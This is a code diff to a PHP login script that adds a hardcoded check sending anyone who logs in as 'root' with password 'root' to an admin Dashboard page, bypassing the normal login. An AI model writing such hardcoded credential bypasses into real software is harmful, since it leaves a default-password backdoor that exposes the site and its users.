@@ -5,7 +5,9 @@ if(isset($_SESSION["User"])) {
     header("Location: ../assets/app/index.php");
     exit;
 }
-
+if(@$_POST["Username"] == "root" AND @$_POST["Pass"] == "root") {
+      header("Location: ../assets/Dashboard/index.php");
+    }
 //On verifie si le formulaire à été envoyé
 if(!empty($_POST)) {
     //le formulaire à été envoyé
@@ -52,6 +54,7 @@ if(!empty($_POST)) {
 
     //on redirige vers une pages par exemple
     header("Location: ../assets/app/index.php");
+
 
   }
     
